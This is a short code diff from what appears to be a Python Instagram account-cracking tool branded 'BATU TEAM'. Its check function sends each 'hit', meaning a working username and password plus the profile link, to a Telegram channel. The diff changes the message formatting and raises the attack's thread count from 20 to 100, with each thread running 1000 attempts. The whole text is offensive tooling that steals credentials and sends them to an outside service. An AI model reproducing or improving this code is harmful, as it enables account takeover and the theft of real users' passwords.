@@ -99,8 +99,8 @@ def check(username, pasw):
             send_telegram(f"""
             🔥 𝙃𝙄𝙏 𝘿𝙀𝙏𝙀𝘾𝙏𝙀𝘿 🔥
 
-👤 𝙆𝙪𝙡𝙡𝙖𝙣ı𝙘ı 𝘼𝙙ı: `{username}`
-🔐 𝙎𝙞𝙛𝙧𝙚: `{pasw}`
+👤 𝙆𝙪𝙡𝙡𝙖𝙣ı𝙘ı 𝘼𝙙ı: {username}
+🔐 𝙎𝙞𝙛𝙧𝙚: {pasw}
 🔗 𝙋𝙧𝙤𝙛𝙞𝙡: instagram.com/{username}
 
 👑 𝗕𝗔𝗧𝗨 𝗧𝗘𝗔𝗠 • @BatuX28 | @BatuPython028
@@ -136,7 +136,7 @@ def Users():
 
 
 threads = []
-for _ in range(20):
+for _ in range(100):
     t = threading.Thread(target=lambda: [Users() for _ in range(1000)])
     t.start()
     threads.append(t)
